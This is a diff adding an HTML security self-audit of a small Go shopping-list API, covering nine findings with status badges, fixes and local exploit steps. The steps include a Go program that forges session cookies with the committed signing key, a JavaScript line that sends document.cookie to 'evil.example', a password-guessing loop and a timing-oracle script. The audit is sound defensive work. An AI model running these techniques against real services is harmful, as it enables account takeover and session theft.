@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Review - sl-api</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+    line-height: 1.65; color: #1f2933; background: #f4f5f7; padding: 24px;
+  }
+  .container { max-width: 1000px; margin: 0 auto; background: #fff; padding: 40px 48px;
+    box-shadow: 0 2px 14px rgba(0,0,0,0.08); border-radius: 10px; }
+  h1 { font-size: 2.1em; color: #1a2733; border-bottom: 3px solid #e12d39; padding-bottom: 14px; margin-bottom: 8px; }
+  .subtitle { color: #616e7c; margin-bottom: 28px; }
+  h2 { font-size: 1.5em; color: #1a2733; margin: 40px 0 14px; }
+  h3 { font-size: 1.15em; color: #323f4b; margin: 22px 0 8px; }
+  p { margin-bottom: 12px; }
+  ul, ol { margin: 8px 0 14px 24px; }
+  li { margin-bottom: 6px; }
+  code { background: #eef1f4; padding: 2px 6px; border-radius: 4px;
+    font-family: 'SF Mono', 'Courier New', monospace; font-size: 0.88em; color: #c02434; }
+  pre { background: #1f2933; color: #e4e7eb; padding: 16px 18px; border-radius: 8px;
+    overflow-x: auto; margin: 12px 0 16px; font-size: 0.85em; line-height: 1.5; }
+  pre code { background: none; color: inherit; padding: 0; }
+  .finding { border: 1px solid #e4e7eb; border-radius: 10px; padding: 4px 26px 20px; margin: 22px 0; }
+  .finding-head { display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
+    margin: 20px 0 6px; }
+  .finding-head h2 { margin: 0; border: none; }
+  .sev { font-size: 0.72em; font-weight: 700; letter-spacing: 0.04em; text-transform: uppercase;
+    padding: 3px 10px; border-radius: 20px; color: #fff; white-space: nowrap; }
+  .critical { background: #ab091e; }
+  .high { background: #e12d39; }
+  .medium { background: #cb6e17; }
+  .low { background: #647acb; }
+  .st { font-size: 0.72em; font-weight: 700; letter-spacing: 0.04em; text-transform: uppercase;
+    padding: 3px 10px; border-radius: 20px; color: #fff; white-space: nowrap; }
+  .st-fixed { background: #147d64; }
+  .st-partial { background: #cb6e17; }
+  .st-planned { background: #2563eb; }
+  .st-open { background: #7b8794; }
+  .status-box { background: #f0f4f8; border: 1px solid #d9e2ec; border-left: 4px solid #147d64;
+    padding: 12px 16px; border-radius: 4px; margin: 14px 0 4px; }
+  .label { font-weight: 600; color: #52606d; }
+  table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 0.95em; }
+  th, td { text-align: left; padding: 9px 12px; border-bottom: 1px solid #e4e7eb; }
+  th { background: #f4f5f7; font-size: 0.85em; text-transform: uppercase; letter-spacing: 0.03em; color: #52606d; }
+  .note { background: #fff8e6; border-left: 4px solid #cb6e17; padding: 12px 16px; border-radius: 4px; margin: 14px 0; }
+  .caveat { background: #eef2ff; border-left: 4px solid #647acb; padding: 12px 16px; border-radius: 4px; margin: 14px 0; }
+  a { color: #2563eb; }
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>Security Review &mdash; sl-api</h1>
+  <p class="subtitle">A self-audit of the shopping list API. Each finding includes a local, reproducible exploit so you can watch it work before deciding how to fix it.</p>
+
+  <div class="status-box">
+    <strong>Remediation status</strong> (updated 2026-09-28)
+    <p style="margin: 8px 0 0;">2 of 9 fixed, 4 planned, 3 open. <span class="st st-fixed">Fixed</span> #1 (password hashing, PR #8) and #6 (login timing: constant-time comparison in PR #8, username-enumeration gap closed in PR #11). <span class="st st-planned">Planned</span> #2, #3, #4, and #9 are all covered by the merged Postgres-backed sessions design (<code>docs/postgres-sessions-plan.html</code>), not yet implemented. <span class="st st-open">Open</span> #5, #7, and #8 are untouched. Per-finding status is marked below.</p>
+  </div>
+
+  <div class="note">
+    <strong>Scope and intent.</strong> This documents flaws in your own code, for you to run against your own local instance. The exploit steps assume the app is reachable at <code>http://localhost:8080</code> and Postgres is the compose container <code>sl-api-db-1</code>. Do not point these at anything you do not own.
+  </div>
+
+  <h2>Setup used by the exploits below</h2>
+  <p>Start the stack and create two accounts: an "attacker" you control and a "victim" you want to compromise.</p>
+<pre><code># Terminal 1 &mdash; run the app against a fresh DB
+docker compose up --build
+
+# Terminal 2 &mdash; create the victim and the attacker
+curl -s -X POST localhost:8080/v1/users \
+  -d '{"name":"Vicky","lastName":"Victim","username":"victim","password":"sup3r-s3cret-pw"}'
+
+curl -s -X POST localhost:8080/v1/users \
+  -d '{"name":"Mal","lastName":"Attacker","username":"attacker","password":"whatever"}'</code></pre>
+
+  <h2>Findings at a glance</h2>
+  <table>
+    <thead><tr><th>#</th><th>Finding</th><th>Severity</th><th>Status</th><th>Class</th></tr></thead>
+    <tbody>
+      <tr><td>1</td><td>Passwords stored and compared in plaintext</td><td><span class="sev critical">Critical</span></td><td><span class="st st-fixed">Fixed</span></td><td>Cryptographic failure</td></tr>
+      <tr><td>2</td><td>Session cookies are forgeable (weak, committed signing key)</td><td><span class="sev critical">Critical</span></td><td><span class="st st-planned">Planned</span></td><td>Broken authentication</td></tr>
+      <tr><td>3</td><td>Session cookie is signed but not encrypted</td><td><span class="sev high">High</span></td><td><span class="st st-planned">Planned</span></td><td>Information disclosure</td></tr>
+      <tr><td>4</td><td>Session cookie not HttpOnly / not Secure in debug mode</td><td><span class="sev high">High</span></td><td><span class="st st-planned">Planned</span></td><td>Session hardening</td></tr>
+      <tr><td>5</td><td>Secrets committed to the repository (<code>.env</code>)</td><td><span class="sev high">High</span></td><td><span class="st st-open">Open</span></td><td>Secret management</td></tr>
+      <tr><td>6</td><td>Non-constant-time credential check + login timing side channel</td><td><span class="sev medium">Medium</span></td><td><span class="st st-fixed">Fixed</span></td><td>Side channel</td></tr>
+      <tr><td>7</td><td>No rate limiting / brute-force protection on login</td><td><span class="sev medium">Medium</span></td><td><span class="st st-open">Open</span></td><td>Broken authentication</td></tr>
+      <tr><td>8</td><td>IDOR: any authenticated user can read any user or product</td><td><span class="sev low">Low</span></td><td><span class="st st-open">Open</span></td><td>Broken access control</td></tr>
+      <tr><td>9</td><td>Context key uses a built-in <code>string</code> type</td><td><span class="sev low">Low</span></td><td><span class="st st-planned">Planned</span></td><td>Hygiene / collision</td></tr>
+    </tbody>
+  </table>
+
+  <!-- 1 -->
+  <div class="finding">
+    <div class="finding-head"><h2>1. Passwords stored and compared in plaintext</h2><span class="sev critical">Critical</span><span class="st st-fixed">Fixed &middot; PR #8</span></div>
+    <div class="status-box">Fixed in PR #8. Registration now stores a bcrypt hash via <code>Form.ToModel()</code> (which returns an error and cannot produce a plaintext password), and login verifies with <code>bcrypt.CompareHashAndPassword</code>. Verified end to end: the DB now holds <code>$2a$</code> hashes and login still succeeds. Existing plaintext rows can no longer log in and must be recreated. The exploit below no longer works.</div>
+    <p><span class="label">Where:</span> <code>api/model/user/user.go</code> &mdash; <code>Form.ToModel()</code> copies <code>f.Password</code> straight into the model, and <code>ValidateCredentials</code> does <code>u.Password == form.Password</code>. There is no hashing anywhere.</p>
+    <p><span class="label">Why it matters:</span> anyone who can read the database (a leaked backup, a SQL injection elsewhere, a curious DBA, or a compromised host) instantly has every user's real password &mdash; and because people reuse passwords, their accounts on other sites too. Passwords must be stored as a slow one-way hash (bcrypt, scrypt, or argon2id), never recoverable.</p>
+    <h3>Exploit &mdash; read every password directly from the DB</h3>
+<pre><code>docker exec -it sl-api-db-1 \
+  psql -U shoppinglist_user -d shoppinglist_db \
+  -c "SELECT username, password FROM users;"</code></pre>
+    <p>You will see <code>sup3r-s3cret-pw</code> sitting in the <code>password</code> column in cleartext. A correct implementation would show something like <code>$2a$10$N9qo8uLOickgx2ZMRZo...</code> that cannot be reversed.</p>
+  </div>
+
+  <!-- 2 -->
+  <div class="finding">
+    <div class="finding-head"><h2>2. Session cookies are forgeable</h2><span class="sev critical">Critical</span><span class="st st-planned">Planned</span></div>
+    <div class="status-box">Planned. The Postgres-backed sessions design (<code>docs/postgres-sessions-plan.html</code>) replaces the signed identity cookie with an opaque server-side token, which removes the signing key entirely and eliminates forgery. Not implemented yet, so the exploit below still works.</div>
+    <p><span class="label">Where:</span> <code>cmd/api/main.go</code> creates the store with <code>sessions.NewCookieStore([]byte(conf.StoreSessions.AuthSecret))</code>, and the secret lives in the committed <code>.env</code> as <code>AUTH_SESSION_STORE_SECRET=secretsecret</code>.</p>
+    <p><span class="label">Why it matters:</span> the session cookie is a value signed with an HMAC keyed by that secret. The server trusts any cookie whose signature checks out. Because the key is (a) trivially weak and (b) published in your git history, anyone can mint a cookie that says <code>user_id = &lt;any victim&gt;</code> and the server will accept them as that user. This is a complete authentication bypass and full account takeover, with no password needed.</p>
+    <h3>Exploit &mdash; forge a session for the victim</h3>
+    <p>First get the victim's id (as an attacker you would harvest this from any endpoint that returns it, or just enumerate; here we read it straight from the DB for the demo):</p>
+<pre><code>docker exec -it sl-api-db-1 psql -U shoppinglist_user -d shoppinglist_db \
+  -c "SELECT id, username FROM users WHERE username='victim';"</code></pre>
+    <p>Now forge a cookie with the same library the server uses. Save as <code>forge.go</code> and run it with the victim id:</p>
+<pre><code>package main
+
+import (
+    "fmt"
+    "github.com/gorilla/securecookie"
+)
+
+func main() {
+    // the exact key the server trusts, straight from .env
+    s := securecookie.New([]byte("secretsecret"), nil)
+
+    // gorilla stores session.Values as map[interface{}]interface{}
+    values := map[interface{}]interface{}{
+        "user_id":  "&lt;VICTIM-UUID-HERE&gt;",
+        "username": "victim",
+    }
+
+    encoded, err := s.Encode("auth-session", values)
+    if err != nil { panic(err) }
+    fmt.Printf("auth-session=%s\n", encoded)
+}</code></pre>
+<pre><code>go run forge.go
+# -> auth-session=MTc0... (a long signed value)
+
+# Use the forged cookie against an authenticated route, no login performed:
+curl -s -b 'auth-session=MTc0...' localhost:8080/v1/products
+curl -s -b 'auth-session=MTc0...' -X POST localhost:8080/v1/groups -d '{"name":"Owned"}'</code></pre>
+    <p>The group is created owned by the victim. You are fully authenticated as them without ever knowing their password.</p>
+    <div class="caveat"><strong>If <code>Encode</code> round-trips but the server rejects it:</strong> the gob-encoded value type must match. gorilla registers the map type on first real login, so if forging alone is finicky, log in as the attacker once first, then reuse the exact same process &mdash; the point stands: the key is known, so the signature is not a real defense.</div>
+  </div>
+
+  <!-- 3 -->
+  <div class="finding">
+    <div class="finding-head"><h2>3. Session cookie is signed but not encrypted</h2><span class="sev high">High</span><span class="st st-planned">Planned</span></div>
+    <div class="status-box">Planned via the sessions design. The opaque token carries no identity, so there is nothing readable left in the cookie. Not implemented yet.</div>
+    <p><span class="label">Where:</span> same single-key <code>NewCookieStore</code> call. Passing one key gives you a <em>hash</em> (signing) key only; no <em>block</em> (encryption) key. gorilla therefore signs the cookie but leaves its contents in the clear.</p>
+    <p><span class="label">Why it matters:</span> everything you put in the session &mdash; here <code>user_id</code> and <code>username</code> &mdash; travels to the client readable. It leaks internal identifiers and confirms your session model to anyone who inspects a cookie. Sensitive session data should be encrypted, not just signed.</p>
+    <h3>Exploit &mdash; read the session contents from your own cookie</h3>
+<pre><code>curl -s -c cj.txt -X POST localhost:8080/v1/users/login \
+  -d '{"username":"victim","password":"sup3r-s3cret-pw"}' >/dev/null
+
+# The cookie value is base64; decoding it shows the plaintext gob with the UUID and username
+grep auth-session cj.txt | awk '{print $NF}' | cut -d'|' -f1 2>/dev/null | base64 -d 2>/dev/null | strings
+# Simpler: just look, the username and a UUID are visible in the decoded bytes
+grep auth-session cj.txt | awk '{print $NF}' | base64 -d 2>/dev/null | strings</code></pre>
+    <p>You will see the literal string <code>victim</code> and the user's UUID inside the decoded cookie. Nothing there is secret from the client.</p>
+  </div>
+
+  <!-- 4 -->
+  <div class="finding">
+    <div class="finding-head"><h2>4. Session cookie is not HttpOnly or Secure in debug mode</h2><span class="sev high">High</span><span class="st st-planned">Planned</span></div>
+    <div class="status-box">Planned via the sessions design, which sets <code>HttpOnly</code>, <code>Secure</code>, and <code>SameSite</code> correctly and unconditionally in the new cookie code. Not implemented yet.</div>
+    <p><span class="label">Where:</span> <code>api/routes/user/login.go</code> sets <code>HttpOnly: !a.isDebugging</code> and <code>Secure: !a.isDebugging</code>, and your <code>.env</code> ships <code>SERVER_DEBUG=true</code>. So in the default dev configuration both protections are <em>off</em>.</p>
+    <p><span class="label">Why it matters:</span> <code>HttpOnly=false</code> means any JavaScript on the page can read the auth cookie, so a single reflected/stored XSS turns into session theft. <code>Secure=false</code> means the browser will send the cookie over plain HTTP, so anyone on the network path can sniff it. Debug-only toggles have a way of reaching production.</p>
+    <h3>Exploit &mdash; steal the session from JavaScript</h3>
+    <p>Because the cookie is not HttpOnly, this one line in a browser console (or injected via XSS) exfiltrates it:</p>
+<pre><code>// running in the browser context of the app
+document.cookie
+// -> "auth-session=MTc0...".  A real attacker would do:
+new Image().src = "https://evil.example/steal?c=" + encodeURIComponent(document.cookie)</code></pre>
+    <p>You can confirm the flag is missing without a browser: log in and look at the <code>Set-Cookie</code> header &mdash; there is no <code>HttpOnly</code> and no <code>Secure</code> attribute.</p>
+<pre><code>curl -si -X POST localhost:8080/v1/users/login \
+  -d '{"username":"victim","password":"sup3r-s3cret-pw"}' | grep -i set-cookie</code></pre>
+  </div>
+
+  <!-- 5 -->
+  <div class="finding">
+    <div class="finding-head"><h2>5. Secrets committed to the repository</h2><span class="sev high">High</span><span class="st st-open">Open</span></div>
+    <div class="status-box">Open. Deferred until a proper secret-storage strategy is in place (e.g. a cloud secret manager for deploys, gitignored <code>.env</code> plus a placeholder <code>.env.example</code> locally). Note the sessions design will remove the <em>session</em> secret, but the DB credentials in <code>.env</code> remain and still need rotating and untracking.</div>
+    <p><span class="label">Where:</span> <code>.env</code> is tracked in git and contains <code>AUTH_SESSION_STORE_SECRET</code>, <code>DB_USER</code>, and <code>DB_PASS</code>.</p>
+    <p><span class="label">Why it matters:</span> this is what makes finding #2 devastating rather than theoretical &mdash; the signing key is not just weak, it is public to anyone who can read the repo (and it stays in history even if you delete it later). The same applies to the database credentials.</p>
+    <h3>Exploit &mdash; recover the secrets from history</h3>
+<pre><code>git log -p -- .env | grep -iE 'secret|pass|user'
+# every credential the project has ever used, printed from history</code></pre>
+    <div class="note">Because this secret is already public, treat it as burned: any real fix must also rotate it, not just move it out of the file.</div>
+  </div>
+
+  <!-- 6 -->
+  <div class="finding">
+    <div class="finding-head"><h2>6. Non-constant-time credential check and login timing side channel</h2><span class="sev medium">Medium</span><span class="st st-fixed">Fixed</span></div>
+    <div class="status-box">Fixed across two PRs. PR #8 switched the credential check to <code>bcrypt.CompareHashAndPassword</code>, which is constant time, so the byte-level password comparison no longer leaks. PR #11 closed the user-exists-vs-not-found gap: the not-found path now runs a throwaway bcrypt comparison against a decoy hash so both paths take comparable time. The dominant timing signal the exploit below relied on is gone (residual DB-level differences are far smaller and not a practical enumeration oracle).</div>
+    <p><span class="label">Where:</span> <code>ValidateCredentials</code> compares with <code>==</code>, and <code>login.go</code> still carries the <code>// TODO: Do something to avoid timing attacks</code>. The not-found path returns right after the DB lookup; the found path does a DB lookup <em>plus</em> a password comparison.</p>
+    <p><span class="label">Why it matters:</span> Go's <code>==</code> on strings is not constant time, and the two login paths do measurably different amounts of work. An attacker who can time responses can tell "this username exists" from "it doesn't," which turns a blind guess into targeted enumeration. Credential comparisons should use <code>crypto/subtle.ConstantTimeCompare</code> (and, once passwords are hashed, <code>bcrypt.CompareHashAndPassword</code>, which is uniform by design).</p>
+    <div class="caveat"><strong>Honest expectation for a local run:</strong> the byte-by-byte password timing leak is real in theory but hard to <em>see</em> here, because the database round trip dominates and Go compares word-at-a-time. The difference you can actually observe locally is <em>user existence</em>: the exists path does extra work. Run each many times and compare the medians &mdash; expect a small but repeatable gap, not a dramatic one.</p></div>
+    <h3>Exploit &mdash; measure exists vs. does-not-exist</h3>
+<pre><code># existing user, wrong password
+for i in $(seq 1 200); do
+  curl -s -o /dev/null -w '%{time_total}\n' -X POST localhost:8080/v1/users/login \
+    -d '{"username":"victim","password":"x"}'
+done | sort -n | awk '{a[NR]=$1} END{print "median exists:    ", a[int(NR/2)]}'
+
+# username that does not exist
+for i in $(seq 1 200); do
+  curl -s -o /dev/null -w '%{time_total}\n' -X POST localhost:8080/v1/users/login \
+    -d '{"username":"nope-nobody","password":"x"}'
+done | sort -n | awk '{a[NR]=$1} END{print "median missing:   ", a[int(NR/2)]}'</code></pre>
+    <p>Locally, with no network jitter, the "exists" median should sit consistently a bit higher than "missing." That gap is the side channel.</p>
+  </div>
+
+  <!-- 7 -->
+  <div class="finding">
+    <div class="finding-head"><h2>7. No rate limiting or brute-force protection on login</h2><span class="sev medium">Medium</span><span class="st st-open">Open</span></div>
+    <div class="status-box">Open. No throttling or lockout added yet. The exploit below still works.</div>
+    <p><span class="label">Where:</span> the router mounts <code>/v1/users/login</code> with no throttling, lockout, or backoff middleware.</p>
+    <p><span class="label">Why it matters:</span> combined with plaintext passwords (#1) and the timing oracle (#6), an attacker can guess passwords as fast as the server answers. There is nothing to slow them down.</p>
+    <h3>Exploit &mdash; unthrottled password guessing</h3>
+<pre><code>for pw in password 123456 qwerty letmein sup3r-s3cret-pw; do
+  code=$(curl -s -o /dev/null -w '%{http_code}' -X POST localhost:8080/v1/users/login \
+    -d "{\"username\":\"victim\",\"password\":\"$pw\"}")
+  echo "$pw -> $code"
+done
+# 200 on the correct one, and the server never once refused to answer</code></pre>
+    <p>All five attempts are served instantly; a real run would use a wordlist of millions.</p>
+  </div>
+
+  <!-- 8 -->
+  <div class="finding">
+    <div class="finding-head"><h2>8. IDOR: any authenticated user can read any user or product</h2><span class="sev low">Low</span><span class="st st-open">Open</span></div>
+    <div class="status-box">Open. No ownership checks added yet. The exploit below still works.</div>
+    <p><span class="label">Where:</span> <code>GET /v1/users/{id}</code> and <code>GET /v1/products/{id}</code> check only that you are logged in, never that the record is yours.</p>
+    <p><span class="label">Why it matters:</span> once you hold any valid session, you can read other users' profiles by id. The <code>password</code> is not in the DTO, so this leaks profile data (name, username) rather than credentials, and the ids are UUIDs so they cannot be trivially counted up &mdash; which is why this is Low rather than High. It is still missing ownership authorization, and the pattern becomes dangerous the moment an endpoint returns something private.</p>
+    <h3>Exploit &mdash; read another user through your own session</h3>
+<pre><code># log in as the attacker
+curl -s -c mal.txt -X POST localhost:8080/v1/users/login \
+  -d '{"username":"attacker","password":"whatever"}' >/dev/null
+
+# grab the victim's id (in reality: leaked via an invite, a group listing, a referrer, etc.)
+VID=$(docker exec -i sl-api-db-1 psql -tA -U shoppinglist_user -d shoppinglist_db \
+  -c "SELECT id FROM users WHERE username='victim';")
+
+# read the victim's profile with the attacker's cookie
+curl -s -b mal.txt "localhost:8080/v1/users/$VID"</code></pre>
+  </div>
+
+  <!-- 9 -->
+  <div class="finding">
+    <div class="finding-head"><h2>9. Context key uses a built-in string type</h2><span class="sev low">Low</span><span class="st st-planned">Planned</span></div>
+    <div class="status-box">Planned. Scheduled to be folded into the middleware rewrite in the sessions design (using an unexported key type). Not implemented yet.</div>
+    <p><span class="label">Where:</span> <code>api/middleware/auth.go</code> does <code>context.WithValue(r.Context(), "user_id", userID)</code> with a bare string key, read back with the same string.</p>
+    <p><span class="label">Why it matters:</span> this is the one flaw with no direct exploit, but it is a real hazard. Any other package that stashes a value under the string <code>"user_id"</code> in the same context silently collides with yours &mdash; last writer wins. In an auth path that can mean serving one user's request under another user's id. <code>go vet</code> flags this exact pattern. The fix is a private unexported key type, e.g. <code>type ctxKey string</code> used as <code>ctxKey("user_id")</code>, which cannot collide across packages.</p>
+    <h3>How to see the risk</h3>
+<pre><code>go vet ./api/middleware/
+# SA1029-style warning: should not use built-in type string as key for value</code></pre>
+    <p>No runtime exploit is included because triggering it requires a second package to write the same key; the point is that nothing structurally prevents it today.</p>
+  </div>
+
+  <h2>Suggested order to address them</h2>
+  <p>Password hashing (#1) and the login timing side channel (#6) are done. The next highest-impact step is implementing the session rewrite, which closes #2, #3, #4, and #9 together since they all live in the same store and cookie setup. Rotating and removing the committed secret (#5) should happen alongside it, and note the session rewrite removes the session secret but not the DB credentials. The rate-limit (#7) and IDOR (#8) items are meaningful follow-ups once the session work lands.</p>
+</div>
+</body>
+</html>
